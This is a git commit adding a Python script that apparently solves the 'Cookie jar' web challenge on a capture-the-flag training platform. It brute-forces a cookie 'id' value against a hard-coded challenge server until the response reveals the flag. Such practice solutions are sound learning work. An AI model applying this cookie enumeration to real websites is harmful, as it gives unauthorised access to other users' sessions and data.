2127da287bb801c40efcd1f07a7cd2cbd80dbcc2
Euthanazepam <euthanazepam@protonmail.com>
2024-07-07 19:22:01 +0000

    #add #web - cookie jar

---
+++ Web/Cookie jar/cookie_jar.py
@@ -0,0 +1,29 @@
+from requests import get
+
+
+def get_flag() -> str:
+    """
+    https://codeby.games/en/categories/web/69c96cbd-b933-4803-a2a0-04ce2d7139a7
+    """
+
+    base_url = 'http://62.173.140.174'
+    port = 16003
+
+    flag = ''
+
+    for i in range(129):
+        cookies = {'id': f'{i}'}
+
+        response = get(f'{base_url}:{port}', cookies=cookies).text.split('\n')
+
+        if 'CODEBY' in response[-1]:
+            flag = response[-1][12:]
+            break
+        else:
+            continue
+
+    return flag
+
+
+if __name__ == '__main__':
+    print(get_flag())
